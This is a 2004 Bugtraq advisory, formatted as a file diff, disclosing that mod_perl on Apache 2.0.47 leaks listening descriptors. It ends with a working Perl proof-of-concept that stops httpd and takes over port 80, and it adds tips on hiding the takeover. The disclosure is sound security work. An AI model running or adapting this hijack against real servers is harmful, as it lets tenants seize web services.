@@ -1,0 +1,174 @@
+
+Date: 21 Jan 2004 22:53:33 -0000
+From: Steve Grubb <linux_4ever@...oo.com>
+To: bugtraq@...urityfocus.com
+Subject: Hijacking Apache 2 via mod_perl
+
+
+
+
+Product:         mod_perl
+Versions:        1.99_09 / apache 2.0.47
+URL:             http://perl.apache.org
+Impact:          Daemon Hijacking
+Bug class:       Leaked Descriptor
+Vendor notified: Yes
+Fix available:   No
+Date:            01/21/04
+                                                                                
+                                                                                
+Issue:
+======
+Mod_perl under apache 2.0.x leaks critical file descriptors that can be used to takeover (hijack) the http and https services.
+                                                                                
+                                                                                
+Details:
+========
+Because apache httpd and mod_perl are inter-related, I don't know if you would consider this an apache bug or a mod_perl bug. I am leaning more towards being a general apache 2.0.x bug.
+                                                                                
+Due to Red Hat Linux end of life, I started looking at other Linux distributions to recommend to clients. One I am looking at is Mandrake 9.2. So, I decided to see how the default apache implementation is. I used env_audit and performed the mod_perl test.
+
+The results are much bigger. So trimming to the interesting stuff, I found the following fd's being leaked:
+                                                                                
+Open file descriptor: 3
+Local Port: 443, https
+WARNING - Appears to be a listening descriptor - WAHOO!
+---
+Open file descriptor: 4
+Local Port: 80, http
+WARNING - Appears to be a listening descriptor - WAHOO!
+---
+Open file descriptor: 5
+The descriptor is: pipe:[20034]
+---
+Open file descriptor: 6
+The descriptor is: pipe:[20034]
+---
+Open file descriptor: 7
+The descriptor is: /var/log/httpd/error_log
+---
+Open file descriptor: 8
+The descriptor is: /var/log/httpd/ssl_error_log
+---
+Open file descriptor: 9
+The descriptor is: /var/log/httpd/access_log
+---
+Open file descriptor: 10
+The descriptor is: pipe:[20035]
+---
+Open file descriptor: 11
+The descriptor is: pipe:[20035]
+---
+Open file descriptor: 12
+The descriptor is: /var/log/httpd/ssl_access_log
+---
+Open file descriptor: 13
+The descriptor is: pipe:[20035]
+---
+Open file descriptor: 14
+The descriptor is: /var/log/httpd/ssl_request_log
+---
+Open file descriptor: 15
+The descriptor is: /var/cache/apache2-mod_ssl/ssl_mutex.6791 (deleted)
+---
+Open file descriptor: 16
+Local Port: 80, http
+                                                                                
+Wow! That sure is a lot of leaked descriptors. Out of these, we have 2 wahoo's. Since perl has all the primitives for writing a network server, I decided to explore whether or not its possible to hijack the apache 2 server by mod_perl with no helper "C" programs.
+                                                                                
+                                                                                
+Exploit:
+========
+The technique is simple.
+                                                                                
+1) Fork and daemonize yourself.
+2) Do something evil to apache.
+2) Select on the leaked descriptor and start serving pages.
+                                                                                
+At the end of this advisory is a proof-of-concept program that you can run under mod_perl. It is assumed
+that paying customers can ftp anything they want into their website and mod_perl scripting is enabled.
+                                                                                
+cp mod_perl-sploit.pl /var/www/perl
+                                                                                
+lynx http://localhost/perl/mod_perl-sploit.pl
+                                                                                
+Now, ps -ef to see how things are going:
+                                                                                
+apache  3107  2652  0 17:00 ?   00:00:00 httpd2 -f /etc/httpd/conf/httpd2
+apache  3108  2640  0 17:00 ?   00:00:00 httpd2 -f /etc/httpd/conf/httpd2
+                                                                                
+So far, so good...
+                                                                                
+lynx http://localhost
+                                                                                
+And you should see the "You're owned" message. The really sneaky part is that 'ps -ef' gives only a minor hint that apache has been replaced. The only way to tell something is abnormal is that there's only 2 apache instances when a normal Mandrake server in its default configuration shows 5 instances. But, forking off a few decoy children should be easy enough to do.
+                                                                                
+This was tested on a fully updated Mandrake 9.2 system.
+                                                                                
+One other side note, env_audit only showed the normal 3 open descriptors when run on a Red Hat 9 machine. This would indicate a difference in the implementation of mod_perl between the 2 distributions.
+                                                                                
+Because env_audit is run as an exec'd program, it may not be able to "see" all the descriptors that are available to native mod_perl programs.
+                                                                                
+                                                                                
+Impact:
+=======
+If you give any client access to mod_perl and they can add a new script, they can hijack apache without needing root privileges. Sandboxing or Jailing apache may not help prevent a takeover since the descriptor is leaked into mod_perl.
+                                                                                
+Note, the https listening descriptor is leaked too. I only wanted to demonstrate the feasibility, so I picked the simpler of the two.
+                                                                                
+                                                                                
+Solution:
+=========
+There is no vendor provided solution. Mandrake security has been contacted.
+                                                                                
+I also contacted the apache project in August 2002 about leaked descriptors. In October 2002, I re-contacted them and they confirmed the problem. Feb 2003 the leaked file descriptors were reported by myself to vuln-dev mail list. The bug was partially fixed in apache 2.0.45. Mandrake ships 2.0.47 and seems to leak everything. The patch in 2.0.45 doesn't seem to work at all for mod_perl.
+                                                                                
+To see if you are vulnerable, you can use the env_audit
+program. It comes with directions for testing mod_perl
+in the examples/apache/mod_perl directory.
+http://www.web-insights.net/env_audit
+
+Best Regards,
+Steve Grubb
+                                                                                
+                                                                                
+The code................
+                                                                                
+#!/usr/bin/perl
+                                                                                
+use POSIX qw(setsid);
+                                                                                
+if (!defined(my $pid = fork)) {
+        print "Content-Type: text/html\n\n";
+        print "cannot fork: $!";
+        exit 1;
+} elsif ($pid) { # This is the parent
+        sleep(1);
+        print "Content-Type: text/html\n\n";
+        print "<html><body>Exploit installed</body></html>";
+        system '/usr/sbin/httpd2 -k stop';
+        sleep(2);
+        exit 0;
+}
+                                                                                
+# This is the Child
+setsid;
+sleep(2);
+my $leak = 4;
+open(Server, "+<&$leak");
+while (1) {
+        my $rin = '';
+        vec($rin,fileno(Server),1) = 1;
+        $nfound = select($rout = $rin, undef, undef, undef);
+        if (accept(Client,Server) ) {
+                print Client "HTTP/1.0 200 OK\n";
+                print Client "Content-Length: 40\n";
+                print Client "Content-Type: text/html\n\n";
+                print Client "<html><body>";
+                print Client "You're owned.";
+                print Client "</body></html>";
+                close Client;
+        }
+}
+
+
